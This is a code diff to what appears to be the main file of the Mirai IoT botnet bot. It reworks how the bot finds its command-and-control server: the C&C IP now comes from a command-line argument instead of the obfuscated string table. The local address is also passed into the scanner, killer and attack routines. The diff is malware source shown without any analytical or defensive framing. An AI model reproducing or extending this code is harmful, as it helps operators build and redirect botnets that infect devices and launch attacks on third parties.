@@ -33,6 +33,7 @@ static BOOL unlock_tbl_if_nodebug(char *);
 
 struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1;
+char cncIpAddress[20];
 BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
@@ -46,6 +47,15 @@ static void segv_handler(int sig, siginfo_t *si, void *unused)
 
 int main(int argc, char **args)
 {
+    if (argc == 3) {
+        util_strcpy(cncIpAddress, args[1]);
+#ifdef DEBUG
+        printf("[main] number of arguments: %d\n", argc);
+        printf("[main] cnc ip address (args[1]): %s\n", args[1]);
+        printf("[main] local ip address (args[2]): %s\n", args[2]);
+#endif
+    }
+
     char *tbl_exec_succ;
     char name_buf[32];
     char id_buf[32];
@@ -81,7 +91,7 @@ int main(int argc, char **args)
 #endif
 
 #ifdef DEBUG
-    printf("DEBUG MODE YO\n");
+    printf("[main] DEBUG MODE YO\n");
 
     sleep(1);
 
@@ -100,7 +110,7 @@ int main(int argc, char **args)
         perror("sigaction");
 #endif
 
-    LOCAL_ADDR = util_local_addr();
+    LOCAL_ADDR = util_local_addr(args[2]);
 
     srv_addr.sin_family = AF_INET;
     srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
@@ -160,7 +170,7 @@ int main(int argc, char **args)
 #ifdef DEBUG
     printf("[main] starting scanner\n");
 #endif
-    scanner_init();
+    scanner_init(args[2]);
 #endif
 //#endif
 
@@ -226,7 +236,7 @@ int main(int argc, char **args)
             scanner_kill();
 #endif
             killer_kill();
-            attack_kill_all();
+            attack_kill_all(args[2]);
             kill(pgid * -1, 9);
             exit(0);
         }
@@ -262,7 +272,7 @@ int main(int argc, char **args)
                 {
                     uint8_t id_len = util_strlen(id_buf);
 
-                    LOCAL_ADDR = util_local_addr();
+                    LOCAL_ADDR = util_local_addr(args[2]);
                     send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                     send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                     if (id_len > 0)
@@ -363,10 +373,12 @@ static void anti_gdb_entry(int sig)
 
 static void resolve_cnc_addr(void)
 {
-    table_unlock_val(TABLE_CNC_IP);
-    char* ip = (char *)table_retrieve_val(TABLE_CNC_IP, NULL);
-    srv_addr.sin_addr.s_addr = inet_addr(ip);
-    table_lock_val(TABLE_CNC_IP);
+//    table_unlock_val(TABLE_CNC_IP);
+//    char* ip = (char *)table_retrieve_val(TABLE_CNC_IP, NULL);
+//    srv_addr.sin_addr.s_addr = inet_addr(ip);
+//    table_lock_val(TABLE_CNC_IP);
+
+    srv_addr.sin_addr.s_addr = util_local_addr(cncIpAddress);
 
 #ifdef DEBUG
     int len=20;
